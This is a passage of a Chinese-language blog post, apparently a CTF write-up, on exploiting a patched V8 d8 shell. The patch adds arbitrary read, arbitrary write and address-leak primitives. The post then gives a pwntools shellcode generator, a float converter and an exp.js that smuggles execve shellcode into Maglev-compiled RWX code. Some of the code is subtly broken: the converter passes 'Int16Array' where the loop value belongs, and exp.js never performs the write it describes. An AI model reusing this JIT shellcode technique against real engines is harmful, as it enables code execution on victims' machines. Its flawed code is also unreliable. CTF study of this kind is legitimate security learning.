class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line"><span class="addition">+void Shell::GetAddressOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (info.Length() == 0) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be provided&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[0]);</span></span><br><span class="line"><span class="addition">+  if (!IsHeapObject(*arg)) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be a HeapObject&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  internal::Tagged&lt;internal::HeapObject&gt; obj = internal::Cast&lt;internal::HeapObject&gt;(*arg);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t address = static_cast&lt;uint32_t&gt;(obj-&gt;address());</span></span><br><span class="line"><span class="addition">+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void Shell::ArbRead32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+       Isolate *isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+       if (info.Length() != 1) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Need exactly one argument&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[0]);</span></span><br><span class="line"><span class="addition">+       if (!IsNumber(*arg)) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Argument should be a number&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span></span><br><span class="line"><span class="addition">+       internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span></span><br><span class="line"><span class="addition">+       uint32_t addr = static_cast&lt;uint32_t&gt;(internal::Object::NumberValue(*arg));</span></span><br><span class="line"><span class="addition">+       uint64_t full_addr = base_addr + (uint64_t)addr;</span></span><br><span class="line"><span class="addition">+       uint32_t result = *(uint32_t *)full_addr;</span></span><br><span class="line"><span class="addition">+       info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void Shell::ArbWrite32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+       Isolate *isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+       if (info.Length() != 2) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Need exactly 2 arguments&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::Handle&lt;internal::Object&gt; arg1 = Utils::OpenHandle(*info[0]);</span></span><br><span class="line"><span class="addition">+       internal::Handle&lt;internal::Object&gt; arg2 = Utils::OpenHandle(*info[1]);</span></span><br><span class="line"><span class="addition">+       if (!IsNumber(*arg1) || !IsNumber(*arg2)) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Arguments should be numbers&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span></span><br><span class="line"><span class="addition">+       internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span></span><br><span class="line"><span class="addition">+       uint32_t addr = static_cast&lt;uint32_t&gt;(internal::Object::NumberValue(*arg1));</span></span><br><span class="line"><span class="addition">+       uint32_t value = static_cast&lt;uint32_t&gt;(internal::Object::NumberValue(*arg2));</span></span><br><span class="line"><span class="addition">+       uint64_t full_addr = base_addr + (uint64_t)addr;</span></span><br><span class="line"><span class="addition">+       *(uint32_t *)full_addr = value;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> void Shell::ModuleResolutionSuccessCallback(</span><br><span class="line">     const FunctionCallbackInfo&lt;Value&gt;&amp; info) &#123;</span><br><span class="line">   DCHECK(i::ValidateCallbackInfo(info));</span><br><span class="line"><span class="meta">@@ -3364,7 +3422,13 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;GetAddressOf&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, GetAddressOf));</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;ArbRead32&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, ArbRead32));</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;ArbWrite32&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, ArbWrite32));</span></span><br><span class="line"><span class="addition">+/*  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, Version));</span><br><span class="line"><span class="meta">@@ -3385,13 +3449,13 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;readline&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, ExecuteFile));*/</span></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">   // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">   // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line"><span class="deletion">-  if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="addition">+/*  if (!options.omit_quit) &#123;</span></span><br><span class="line">     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span><br><span class="line">   &#125;</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span><br><span class="line"><span class="meta">@@ -3410,7 +3474,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   if (i::v8_flags.expose_async_hooks) &#123;</span><br><span class="line">     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">                          Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="addition">+  &#125;*/</span></span><br><span class="line"> </span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.h b/src/d8/d8.h</span></span><br><span class="line"><span class="comment">index a19d4a0eae4..476675a7150 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.h</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.h</span></span><br><span class="line"><span class="meta">@@ -507,6 +507,9 @@</span> class Shell : public i::AllStatic &#123;</span><br><span class="line">   &#125;;</span><br><span class="line">   enum class CodeType &#123; kFileName, kString, kFunction, kInvalid, kNone &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  static void GetAddressOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span></span><br><span class="line"><span class="addition">+  static void ArbRead32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span></span><br><span class="line"><span class="addition">+  static void ArbWrite32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span></span><br><span class="line">   static bool ExecuteString(Isolate* isolate, Local&lt;String&gt; source,</span><br><span class="line">                             Local&lt;String&gt; name,</span><br><span class="line">                             ReportExceptions report_exceptions,</span><br></pre></td></tr></table></figure>
+
+<p>看懂上面代码需要了解一些关键的v8引擎原理：</p>
+<ul>
+<li><p>将C++函数暴露给JavaScript(一种方式)：<code>global_template-&gt;Set(isolate, &quot;ArbWrite32&quot;,FunctionTemplate::New(isolate, ArbWrite32));</code>实现<strong>JS 名称到 C++ 函数的映射</strong>，同时对应函数的实现参数与返回需要调用v8对应的api</p>
+</li>
+<li><p><code>v8::Isolate* isolate = info.GetIsolate();</code>从参数中的v8回调对象中得到isolate(V8 的<strong>沙箱和资源管理单元</strong>)，作为所有 V8 操作的<strong>核心上下文和资源容器</strong></p>
+</li>
+<li><p><strong>指针压缩技术</strong>: V8 启用了指针压缩（Pointer Compression）机制。该机制下，堆对象的地址并不是完整的 64 位地址，而是相对于 cage base 的 32 位偏移量，然后再将32位压缩基址转换为64位完整地址。需要用</p>
+<p>  <code>internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</code></p>
+<p>  <code>internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</code>来获得V8堆在进程地址空间中的<strong>起始地址</strong>（64位值）</p>
+</li>
+</ul>
+<p>实现的功能其实就是核心的两大原语:任意地址读➕任意地址写，以及一个获得对象在进程中的地址</p>
+<p>假若在一个c语言写的程序中，我拿到这三个功能那么getshell的思路也就很多了。但是这是js程序中的功能，还没有那么直接简单。首先在题目的v8版本下，<code>MAGLEV compilation</code>机制会为多次重复的函数分配一段具有rwx的区域(并不是所有v8版本都是这样)。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 触发了MAGLEV的行为：</span><br><span class="line">1. 分配RWX内存页（为了性能，避免权限切换）</span><br><span class="line">2. 生成机器代码直接写入RWX页</span><br><span class="line">3. 将常量数据（包括浮点数）**内联嵌入**到代码中</span><br><span class="line">4. 立即执行，无需mprotect()调用</span><br></pre></td></tr></table></figure>
+
+<p>那么基本思路就是在函数中嵌入getshell(以常量数据形式出现)的payload，在exp.js中反复调用对应函数使对应函数，使函数对应的机器码被分配到rwx的区域中。修改指针指向shellcode。</p>
+<p>1.如何获得shellcode地址？</p>
+<p>在js中，函数对象的地址并不是直接指向机器码，而是一个结构体。想要获得函数真实对应的机器码需要<strong>三级跳转</strong>：函数对象 → CodeDataContainer → instruction_start(常量的地址)</p>
+<p>其中每一层跳转都需要找到相应的偏移(后者是前者的结构体成员)。</p>
+<p>2.如何劫持程序流？</p>
+<p>既然已经知道intruction_start指向函数机器码的开始，理所当然的劫持code结构体中的instruction_start成员为shellcode地址就可以执行shellcode了</p>
+<p>3.怎么存shellcode？</p>
+<p>一般选择 <strong>Float64数组（双精度浮点数）</strong></p>
+<ul>
+<li><p><strong>8字节对齐</strong>：正好是x64指令的自然大小</p>
+</li>
+<li><p><strong>IEEE 754标准</strong>：精确的二进制表示</p>
+</li>
+<li><p><strong>MAGLEV友好</strong>：浮点常量常被嵌入代码段</p>
+</li>
+<li><p><strong>无类型混淆</strong>：纯浮点数，V8优化简单</p>
+</li>
+</ul>
+<p>不过需要注意由于<strong>浮点数是八字节的表示形式</strong> ，去掉<strong>前面两个字节的操作</strong> ，<strong>剩下的六个字节就是我们可控的内容</strong> ，然后为了能写成<code>rop</code>的形式，所以<code>6个字节</code>里要已<code>jmp</code>结尾，用来跳到下一个<code>gadget片段</code>，所以我们每一个<code>gadget</code>可以写<strong>四字节的内容+一个jmp</strong></p>
+<p>Shellcode_generator:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jmp = <span class="string">b&quot;\xeb\x0c&quot;</span> <span class="comment">#jump rip+0xc</span></span><br><span class="line">shell_str = <span class="number">0x67616c66746163</span> <span class="comment">#catflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_double</span>(<span class="params">code</span>):</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">6</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">6</span>,<span class="string">b&quot;\x90&quot;</span>)+jmp))[<span class="number">2</span>:]) <span class="comment">#前两字节是0x90(不可控字节)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class="line">make_double(asm(<span class="string">&quot;mov    eax, 0x67616c&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;mov    ebx, 0x66746163&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;shl rax,0x20&quot;</span>))<span class="comment">#左移32位，eax内数值作为高32位</span></span><br><span class="line">make_double(asm(<span class="string">&quot;add rax,rbx;push rax;&quot;</span>))<span class="comment">#ebx内容作为低32位</span></span><br><span class="line">make_double(asm(<span class="string">&quot;mov rdi, rsp;xor esi, esi;&quot;</span>))</span><br><span class="line">code = asm(<span class="string">&quot;xor edx,edx;push 0x3b;pop rax;syscall&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
+
+<p>js_tranlater:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">convert</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> shellcode=[<span class="number">0xceb900067616cb8n</span>,</span><br><span class="line"><span class="number">0xceb9066746163bbn</span>,</span><br><span class="line"><span class="number">0xceb909020e0c148n</span>,</span><br><span class="line"><span class="number">0xceb909050d80148n</span>,</span><br><span class="line"><span class="number">0xceb90f631e78948n</span>,</span><br><span class="line"><span class="number">0x90050f583b6ad231n</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">const</span> floatshellcode=[];</span><br><span class="line">  <span class="keyword">const</span> buffer=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">const</span> dataview=<span class="keyword">new</span> <span class="title class_">DataView</span>(buffer);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> i <span class="keyword">of</span> shellcode)&#123;</span><br><span class="line">    dataview.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,<span class="title class_">Int16Array</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> float=dataview.<span class="title function_">getFloat64</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">    floatshellcode.<span class="title function_">push</span>(float);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> floatshellcode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode=<span class="title function_">convert</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;const shellcode = () =&gt; &#123;return [&quot;</span>);</span><br><span class="line">shellcode.<span class="title function_">forEach</span>(<span class="function">(<span class="params">num, index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;num&#125;</span><span class="subst">$&#123;index &lt; shellcode.length - <span class="number">1</span> ? <span class="string">&#x27;,&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;];&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Exp.js:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">    <span class="number">1.97102559442867765997e-246</span>,</span><br><span class="line">    <span class="number">1.97113694948983498454e-246</span>,</span><br><span class="line">    <span class="number">1.97118242283720987770e-246</span>,</span><br><span class="line">    <span class="number">1.97118262728646853415e-246</span>,</span><br><span class="line">    <span class="number">1.97129379506143829454e-246</span>,</span><br><span class="line">    -<span class="number">1.69562758796691328788e-231</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debug</span>(<span class="params">str,val</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] &quot;</span>+ str + <span class="string">&quot;: &quot;</span> + <span class="string">&quot;0x&quot;</span> + <span class="title function_">hex</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)</span><br><span class="line">    <span class="title function_">shellcode</span>(); <span class="comment">//触发MAGLEV </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode_addr=<span class="title class_">GetAddressOf</span>(shellcode);</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;function address:&quot;</span>,shellcode_addr);</span><br><span class="line"><span class="keyword">let</span> code_addr = <span class="title function_">unptr</span>(<span class="title class_">ArbRead32</span>(shellcode_addr + <span class="number">0xc</span>));</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;code address:&quot;</span>,code_addr);</span><br><span class="line"><span class="keyword">let</span> instruction_start_addr = code_addr + <span class="number">0x14</span>;</span><br><span class="line"><span class="keyword">let</span> shellcode_start = <span class="title class_">ArbRead32</span>(instruction_start_addr)+<span class="number">0x6b</span>;</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;instruction_start address: &quot;</span>,instruction_start_addr);</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;shellcode_start with:&quot;</span>,shellcode_start);</span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/javascript%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%99%A8/" rel="tag"># javascript，解释器</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/12/13/qemu%E8%99%9A%E6%8B%9F%E5%8C%96%E5%88%9D%E6%8E%A2%E7%B4%A2/" rel="prev" title="qemu逃逸初探索">
+                  <i class="fa fa-angle-left"></i> qemu逃逸初探索
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">no_t1me</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
